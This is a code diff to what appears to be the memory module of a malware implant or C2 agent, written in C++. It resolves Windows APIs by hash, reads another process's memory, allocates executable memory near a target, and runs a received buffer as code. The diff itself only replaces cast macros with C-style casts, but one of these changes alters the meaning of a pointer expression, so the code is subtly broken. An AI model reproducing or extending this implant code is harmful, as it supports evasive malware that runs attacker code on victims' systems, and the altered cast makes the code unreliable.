@@ -37,7 +37,7 @@ namespace Memory {
         UINT_PTR GetStackCookie() {
 
             uintptr_t cookie = 0;
-            x_ntassert(Ctx->nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, 0x24), &cookie, 0x4, nullptr));
+            x_ntassert(Ctx->nt.NtQueryInformationProcess(NtCurrentProcess(), (PROCESSINFOCLASS) 0x24, &cookie, 0x4, nullptr));
 
             defer:
             return cookie;
@@ -117,7 +117,7 @@ namespace Memory {
     namespace Modules {
 
         HMODULE GetModuleAddress(const LDR_DATA_TABLE_ENTRY *data) {
-            return R_CAST(HMODULE, data->DllBase);
+            return (HMODULE) data->DllBase;
         }
 
         LDR_DATA_TABLE_ENTRY* GetModuleEntry(const uint32_t hash) {
@@ -157,7 +157,7 @@ namespace Memory {
                     x_memset(lowercase, 0, MAX_PATH);
 
                     if (hash - Utils::GetHashFromStringA(x_mbsToLower(lowercase, name), x_strlen(name)) == 0) {
-                        address = R_CAST(FARPROC, RVA(PULONG, base, funcs[ords[name_index]]));
+                        address = (FARPROC) RVA(PULONG, base, funcs[ords[name_index]]);
                         break;
                     }
                 }
@@ -176,9 +176,10 @@ namespace Memory {
 
             while (!symbol) {
                 if (!(F_PTR_HASHES(symbol, mod_hash, fn_hash))) {
-                    if (reload || !Ctx->win32.LoadLibraryA(S_CAST(const char*, module_name))) {
+                    if (reload || !Ctx->win32.LoadLibraryA((const char*) module_name)) {
                         goto defer;
                     }
+
                     reload = 1;
                 }
             }
@@ -196,7 +197,7 @@ namespace Memory {
             const auto  address = (uintptr_t) target;
 
             for (ret = (address & ADDRESS_MAX) - VM_MAX; ret < address + VM_MAX; ret += 0x10000) {
-                if (!NT_SUCCESS(Ctx->nt.NtAllocateVirtualMemory(process, R_CAST(void **, &ret), 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
+                if (!NT_SUCCESS(Ctx->nt.NtAllocateVirtualMemory(process, (void **) &ret, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
                     ret = 0;
                 }
             }
@@ -219,7 +220,7 @@ namespace Memory {
             uintptr_t   address = 0;
             uint8_t     *buffer = (uint8_t*) x_malloc(size);
 
-            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, R_CAST(void *, start), buffer, size, &read));
+            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, (void*) start, buffer, size, &read));
 
             for (auto i = 0; i < size; i++) {
                 if (SigCompare(buffer + i, signature, mask)) {
@@ -252,7 +253,7 @@ namespace Memory {
 
             x_assertb(address = Memory::Methods::GetInternalAddress(cmd_id));
 
-            cmd = R_CAST(_command, Ctx->base.address + address);
+            cmd = (_command) Ctx->base.address + address;
             cmd(&parser);
 
         defer:
@@ -272,7 +273,7 @@ namespace Memory {
             x_memcpy(address, parser.buffer, parser.Length);
             x_ntassertb(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &address, &size, PAGE_EXECUTE_READ, nullptr));
 
-            exec = R_CAST(void(*)(), address);
+            exec = (void(*)()) address;
             exec();
 
             x_memset(address, 0, size);
